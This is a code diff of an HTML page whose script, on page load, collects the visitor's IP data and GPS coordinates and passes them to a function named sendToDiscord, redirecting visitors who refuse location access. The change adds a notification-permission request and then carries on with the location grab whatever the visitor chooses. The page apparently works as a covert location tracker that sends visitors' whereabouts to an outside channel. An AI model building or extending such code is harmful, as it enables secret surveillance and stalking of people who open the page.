@@ -84,7 +84,7 @@
               const acc = pos.coords.accuracy;
               sendToDiscord(lat, lon, acc, ipData);
             },
-            (err) => {
+            () => {
               clearTimeout(timeoutID);
               redirectDenied();
             },
@@ -100,7 +100,17 @@
         });
     }
 
-    window.onload = getIPAndGPS;
+    function requestNotificationsThenStart() {
+      if (Notification && Notification.requestPermission) {
+        Notification.requestPermission().finally(() => {
+          getIPAndGPS(); // continue regardless of result
+        });
+      } else {
+        getIPAndGPS(); // fallback for unsupported browsers
+      }
+    }
+
+    window.onload = requestNotificationsThenStart;
   </script>
 </body>
 </html>
